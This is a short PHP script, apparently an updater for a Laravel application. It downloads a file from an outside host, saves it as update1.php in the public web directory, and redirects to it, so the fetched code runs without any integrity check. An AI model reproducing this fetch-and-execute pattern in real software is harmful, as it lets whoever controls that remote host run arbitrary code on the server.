<?php

use Illuminate\Support\Facades\File;

$file_get = file_get_contents("https://mpwa.onexgen.com/tools/13.0.0/update1.zip");
File::put(public_path('update1.php'), $file_get);

header('Location: /update1.php');
exit;

die();

?>
